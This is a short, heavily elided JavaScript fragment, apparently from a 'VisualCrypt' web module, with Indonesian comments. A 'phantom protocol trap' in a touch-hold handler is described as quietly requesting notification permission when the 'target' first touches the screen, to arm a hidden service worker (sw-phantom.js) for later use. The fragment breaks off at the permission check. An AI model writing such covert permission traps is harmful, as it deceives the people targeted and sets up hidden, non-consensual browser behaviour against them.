 ...
 * Status: MILITARY-GRADE PATCHED (Tahap 1 - Phantom Trap Trigger)
 */
...
const VisualCrypt = {
    ...
    setupKineticLock: function(holdCallback, releaseCallback) {
        ...
        const engageLock = (e) => {
            ...
            // --- [JEBAKAN PHANTOM PROTOCOL] ---
            // Meminta izin notifikasi secara diam-diam saat target pertama kali menyentuh layar
            // Ini akan menghidupkan fitur sw-phantom.js saat Kapsul meledak nanti.
            if (this.options.phantom && 'Notification' in window) {
